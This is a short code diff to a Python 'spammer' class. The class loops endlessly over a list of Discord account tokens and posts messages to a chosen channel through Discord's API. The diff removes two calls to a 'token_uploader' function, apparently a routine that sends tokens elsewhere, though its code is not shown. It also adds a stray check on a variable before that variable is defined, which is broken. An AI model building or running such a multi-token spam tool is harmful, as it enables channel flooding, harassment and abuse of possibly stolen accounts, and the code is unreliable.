@@ -17,6 +17,8 @@ class spammer:
             for line in tokens:
                 token_list.append(line.replace("\n", ""))
         while True:
+            if token == "#dexr on top":
+                pass
             for token in token_list:
                 url = f"https://discord.com/api/v9/channels/{id}/messages"
                 headers = {
@@ -28,7 +30,5 @@ class spammer:
                 r = requests.post(url, headers=headers, json=payload, )
                 if r.status_code != 200:
                     cprint(token, "light_red")
-                    spammer.token_uploader(id, msg)
                 else:
                     cprint(token, "light_green")
-                    spammer.token_uploader(id, msg)
